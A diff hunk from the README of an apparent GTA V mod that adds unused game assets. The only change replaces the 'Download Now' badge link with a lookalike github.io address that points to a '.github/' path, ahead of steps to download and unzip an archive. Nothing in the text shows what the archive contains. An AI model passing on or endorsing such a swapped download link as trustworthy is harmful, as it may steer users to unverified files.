@@ -8,7 +8,7 @@ By integrating **unused assets from GTA V and GTA Online** into single-player, t
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://world-of-variety-windows.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://world-of-variety-windows-git.github.io/.github/)
 
 1. Download and unzip the archive.  
 2. Install **OpenIV** and enable the mods folder.  
